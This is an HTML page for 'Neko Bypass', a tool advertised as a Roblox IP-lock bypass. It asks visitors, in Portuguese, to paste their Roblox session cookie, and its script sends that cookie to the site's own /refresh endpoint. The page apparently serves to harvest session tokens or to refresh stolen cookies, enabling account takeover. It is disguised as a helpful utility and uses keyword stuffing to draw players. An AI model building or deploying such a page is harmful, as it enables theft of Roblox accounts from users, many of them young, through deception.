<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta name="robots" content="index, follow">
    <link rel="apple-touch-icon" sizes="180x180" href="/assets/img/icon/apple/180x180.ico" />
    <link rel="icon" type="image/png" sizes="32x32" href="/assets/img/icon/32x32.ico" />
    <link rel="icon" type="image/png" sizes="16x16" href="/assets/img/icon/16x16.ico" />
    <meta http-equiv="X-UA-Compatible" content="chrome=1" />
    <meta property="og:title" content="Neko Bypass">
    <meta property="og:description" content="Website that changes cookies Roblox">
    <meta name="keywords" content="Roblox IP restriction bypass, Unblock restricted IP on Roblox, Bypass Roblox IP lock, Access blocked Roblox IP, Roblox IP unblocker, Overcoming Roblox IP restrictions, Roblox IP block bypass, Bypassing Roblox IP lock, Roblox IP restriction removal, Unlocking blocked Roblox IP, roblox, robux, roblox ip lock, roblox ip lock bypass, rbxfresh" />
    <meta property="og:image" content="/assets/img/icon/180x180.png">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta1/dist/css/bootstrap.min.css" rel="stylesheet" crossorigin="anonymous" />
    <link rel="stylesheet" href="/assets/css/styles.css">
    <title>Neko Bypass</title>
    <style>
        body {
            background-color: #000;
            color: white;
            font-family: Arial, sans-serif;
        }
        .main-content {
            text-align: center;
            margin-top: 50px;
        }
        .main-title {
            font-size: 32px;
            margin-bottom: 10px;
        }
        .main-subtitle {
            font-size: 20px;
            margin-bottom: 20px;
        }
        .main-input {
            width: 60%;
            padding: 10px;
            margin-bottom: 20px;
            border-radius: 5px;
            border: 1px solid #333;
            background-color: #222;
            color: white;
            font-size: 16px;
        }
        .main-button {
            padding: 10px 20px;
            border-radius: 5px;
            background-color: #333;
            border: none;
            cursor: pointer;
            color: white;
            font-size: 18px;
            transition: background-color 0.3s;
        }
        .main-button:hover {
            background-color: #555;
        }
        .result-button {
            padding: 8px 15px;
            margin-top: 10px;
            background-color: #444;
            border: none;
            border-radius: 5px;
            color: white;
            cursor: pointer;
            font-size: 16px;
        }
    </style>
</head>
<body>
    <div class="main-content">
        <h1 class="main-title">Neko Bypass</h1>
        <input type="text" id="cookie" class="main-input" placeholder="Digite seu cookie Roblox aqui">
        <br>
        <button onclick="sendCookie()" class="main-button">Bypass</button>
        <p id="result"></p>
    </div>

    <script>
        async function sendCookie() {
            const c = document.getElementById("cookie").value;
            const res = await fetch(`${location.origin}/refresh?cookie=${encodeURIComponent(c)}`);
            const result = document.getElementById("result");
            if (res.ok) {
                result.innerText = "Cookie enviado com sucesso!";
            } else {
                result.innerText = "Falha ao enviar o cookie.";
            }
        }
    </script>
</body>
</html>
